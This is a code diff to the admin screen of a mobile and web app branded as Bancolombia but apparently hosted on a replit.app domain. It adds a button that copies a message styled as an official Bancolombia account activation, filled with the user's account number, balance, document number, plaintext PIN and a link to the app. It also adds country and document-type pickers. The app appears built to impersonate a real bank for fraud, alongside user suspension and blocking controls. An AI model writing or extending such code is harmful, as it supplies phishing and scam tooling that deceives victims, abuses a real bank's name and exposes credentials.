@@ -1,6 +1,7 @@
 import { Feather } from "@expo/vector-icons";
 import React, { useCallback, useEffect, useState } from "react";
 import {
+  Alert,
   Modal,
   Platform,
   ScrollView,
@@ -13,6 +14,8 @@ import {
 import { useSafeAreaInsets } from "react-native-safe-area-context";
 import { useApp } from "@/context/AppContext";
 import type { RegisteredUser, SuspensionStep, StepType } from "@/context/AppContext";
+import { ALL_DOC_TYPES, DOC_TYPE_LABELS, COUNTRIES, getCountryByCode, formatBalance } from "@/constants/countries";
+import * as Clipboard from "expo-clipboard";
 import type { DocType } from "@/constants/countries";
 
 const BG = "#0F1320";
@@ -24,11 +27,17 @@ const YELLOW = "#FDDA24";
 const GREEN = "#10B981";
 const RED = "#EF4444";
 const ORANGE = "#F59E0B";
+const BLUE = "#60A5FA";
 
 const STATUS_COLOR: Record<string, string> = { active: GREEN, suspended: ORANGE, blocked: RED };
 const STATUS_LABEL: Record<string, string> = { active: "Activo", suspended: "Suspendido", blocked: "Bloqueado" };
 
-const DOC_TYPES: DocType[] = ["CC", "CE", "PA"];
+function getAppUrl(): string {
+  if (Platform.OS === "web" && typeof window !== "undefined") {
+    return window.location.origin;
+  }
+  return "https://bancolombia.replit.app";
+}
 
 const SUSPENSION_REASONS = [
   "Actividad sospechosa",
@@ -42,7 +51,7 @@ const SUSPENSION_REASONS = [
 ];
 
 export default function UsuariosScreen() {
-  const { getAllUsers, updateUser, deleteUser, createUser, addAuditLog } = useApp();
+  const { getAllUsers, updateUser, deleteUser, createUser, addAuditLog, getAllAccounts } = useApp();
   const insets = useSafeAreaInsets();
   const topPad = insets.top > 0 ? insets.top : 20;
 
@@ -228,6 +237,53 @@ export default function UsuariosScreen() {
 
   const removeStep = (id: string) => setSuspendSteps((p) => p.filter((s) => s.id !== id));
 
+  const copyTemplate = async (u: RegisteredUser) => {
+    try {
+      const allAccounts = await getAllAccounts();
+      const userAccounts = allAccounts.filter((a) => a.userId === u.id);
+      const savings = userAccounts.find((a) => a.type === "savings") ?? userAccounts[0];
+      const balance = savings ? formatBalance(savings.balance, savings.currencyCode, savings.currencySymbol, true) : "$ 0.00 COP";
+      const accountNumber = savings ? savings.number : "—";
+      const fullName = [u.firstName, u.secondName, u.lastName, u.secondLastName].filter(Boolean).join(" ").toUpperCase();
+      const appUrl = getAppUrl();
+
+      const template =
+`*ACTIVACIÓN DE CUENTA BANCARIA – BANCOLOMBIA*
+Estimado *${fullName}*,
+por medio de este mensaje se realiza la entrega de los datos correspondientes a su cuenta bancaria Bancolombia, habilitada para su activación y acceso.
+
+🏦 Banco: Bancolombia
+💳 Tipo de cuenta: Ahorros
+🔢 Número de cuenta: *${accountNumber}*
+
+💰 *Saldo disponible:* ${balance}
+👤 *Titular:* *${fullName}*
+🪪 *Documento (${u.documentType}):* ${u.documentNumber}
+📧 *Correo electrónico:* ${u.email}
+*🔐 Datos de acceso*
+*Usuario*: ${u.documentNumber}
+*Contraseña*: ${u.pin}
+*🔗 Link de acceso Bancolombia:*
+${appUrl}
+Este enlace le permitirá ingresar a su cuenta y realizar la activación correspondiente.
+Quedamos atentos ante cualquier novedad.`;
+
+      if (Platform.OS === "web" && typeof navigator !== "undefined" && navigator.clipboard) {
+        await navigator.clipboard.writeText(template);
+      } else {
+        await Clipboard.setStringAsync(template);
+      }
+
+      if (Platform.OS === "web") {
+        window.alert("✅ Plantilla copiada al portapapeles");
+      } else {
+        Alert.alert("✅ Copiado", "La plantilla fue copiada al portapapeles.");
+      }
+    } catch {
+      Alert.alert("Error", "No se pudo copiar la plantilla.");
+    }
+  };
+
   const handleCreate = async () => {
     setCreateError("");
     if (!newUser.firstName.trim()) return setCreateError("Ingresa el primer nombre");
@@ -372,6 +428,11 @@ export default function UsuariosScreen() {
                       </TouchableOpacity>
                     ))}
                   </View>
+
+                  <TouchableOpacity style={styles.copyTemplateBtn} onPress={() => copyTemplate(u)}>
+                    <Feather name="copy" size={14} color={BLUE} />
+                    <Text style={styles.copyTemplateBtnText}>Copiar Plantilla</Text>
+                  </TouchableOpacity>
 
                   <View style={styles.actionRow}>
                     <TouchableOpacity style={styles.editBtn} onPress={() => openEdit(u)}>
@@ -674,15 +735,52 @@ export default function UsuariosScreen() {
               <EF label="Segundo nombre" value={newUser.secondName} onChange={(v) => setNewUser((p) => ({ ...p, secondName: v }))} />
               <EF label="Primer apellido *" value={newUser.lastName} onChange={(v) => setNewUser((p) => ({ ...p, lastName: v }))} />
               <EF label="Segundo apellido" value={newUser.secondLastName} onChange={(v) => setNewUser((p) => ({ ...p, secondLastName: v }))} />
+              <Text style={styles.editLabel}>País de residencia *</Text>
+              <ScrollView horizontal showsHorizontalScrollIndicator={false} style={{ marginBottom: 12 }}>
+                <View style={{ flexDirection: "row", gap: 6 }}>
+                  {COUNTRIES.map((c) => (
+                    <TouchableOpacity
+                      key={c.code}
+                      style={[styles.countryChip, newUser.countryResidence === c.code && styles.countryChipActive]}
+                      onPress={() => {
+                        setNewUser((p) => ({
+                          ...p,
+                          countryResidence: c.code,
+                          currencyCode: c.currencyCode,
+                          currencySymbol: c.currencySymbol,
+                          documentType: c.docTypes[0] as DocType,
+                        }));
+                      }}
+                    >
+                      <Text style={{ fontSize: 16 }}>{c.flag}</Text>
+                      <Text style={[styles.countryChipText, { color: newUser.countryResidence === c.code ? YELLOW : TEXTSEC }]}>
+                        {c.name}
+                      </Text>
+                    </TouchableOpacity>
+                  ))}
+                </View>
+              </ScrollView>
+
+              <Text style={styles.editLabel}>Divisa</Text>
+              <View style={[styles.editInput, { marginBottom: 12, flexDirection: "row", alignItems: "center", gap: 8 }]}>
+                <Text style={{ fontSize: 18, color: YELLOW }}>{newUser.currencySymbol}</Text>
+                <Text style={{ fontSize: 14, color: TEXT, fontFamily: "Inter_500Medium" }}>
+                  {newUser.currencyCode} — {COUNTRIES.find((c) => c.code === newUser.countryResidence)?.currency ?? ""}
+                </Text>
+              </View>
+
               <Text style={styles.editLabel}>Tipo de documento *</Text>
-              <View style={{ flexDirection: "row", gap: 8, marginBottom: 12 }}>
-                {DOC_TYPES.map((dt) => (
+              <View style={{ flexDirection: "row", flexWrap: "wrap", gap: 6, marginBottom: 12 }}>
+                {ALL_DOC_TYPES.map((dt) => (
                   <TouchableOpacity
                     key={dt}
-                    style={[styles.statusBtn, { flex: 1, justifyContent: "center", paddingVertical: 10, borderColor: newUser.documentType === dt ? YELLOW : BORDER, backgroundColor: newUser.documentType === dt ? YELLOW + "22" : "transparent" }]}
+                    style={[styles.docTypeChip, newUser.documentType === dt && styles.docTypeChipActive]}
                     onPress={() => setNewUser((p) => ({ ...p, documentType: dt }))}
                   >
-                    <Text style={[styles.statusBtnText, { color: newUser.documentType === dt ? YELLOW : TEXTSEC }]}>{dt}</Text>
+                    <Text style={[styles.docTypeChipCode, { color: newUser.documentType === dt ? YELLOW : TEXTSEC }]}>{dt}</Text>
+                    <Text style={[styles.docTypeChipLabel, { color: newUser.documentType === dt ? YELLOW + "BB" : TEXTSEC + "88" }]} numberOfLines={1}>
+                      {DOC_TYPE_LABELS[dt].split(" (")[0].split(" —")[0]}
+                    </Text>
                   </TouchableOpacity>
                 ))}
               </View>
@@ -764,6 +862,15 @@ const styles = StyleSheet.create({
   editBtnText: { fontSize: 13, fontFamily: "Inter_600SemiBold", color: YELLOW },
   deleteBtn: { flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 6, backgroundColor: RED + "15", borderRadius: 10, borderWidth: 1, borderColor: RED + "40", paddingVertical: 10 },
   deleteBtnText: { fontSize: 13, fontFamily: "Inter_600SemiBold", color: RED },
+  copyTemplateBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 8, backgroundColor: BLUE + "15", borderRadius: 10, borderWidth: 1, borderColor: BLUE + "40", paddingVertical: 10, marginTop: 10 },
+  copyTemplateBtnText: { fontSize: 13, fontFamily: "Inter_600SemiBold", color: BLUE },
+  countryChip: { flexDirection: "row", alignItems: "center", gap: 5, paddingHorizontal: 10, paddingVertical: 8, borderRadius: 10, borderWidth: 1, borderColor: BORDER, backgroundColor: "#0A0E1A" },
+  countryChipActive: { borderColor: YELLOW + "60", backgroundColor: YELLOW + "15" },
+  countryChipText: { fontSize: 11, fontFamily: "Inter_500Medium" },
+  docTypeChip: { flexDirection: "column", alignItems: "center", paddingHorizontal: 10, paddingVertical: 8, borderRadius: 10, borderWidth: 1, borderColor: BORDER, backgroundColor: "#0A0E1A", minWidth: 72 },
+  docTypeChipActive: { borderColor: YELLOW + "60", backgroundColor: YELLOW + "15" },
+  docTypeChipCode: { fontSize: 13, fontFamily: "Inter_700Bold" },
+  docTypeChipLabel: { fontSize: 9, fontFamily: "Inter_400Regular", textAlign: "center", marginTop: 2 },
   empty: { fontSize: 14, fontFamily: "Inter_400Regular", color: TEXTSEC, textAlign: "center", paddingVertical: 40 },
   modalOverlay: { flex: 1, backgroundColor: "rgba(0,0,0,0.7)", justifyContent: "flex-end" },
   modalCard: { backgroundColor: "#161B2E", borderTopLeftRadius: 24, borderTopRightRadius: 24, padding: 24, maxHeight: "92%", borderWidth: 1, borderColor: BORDER },
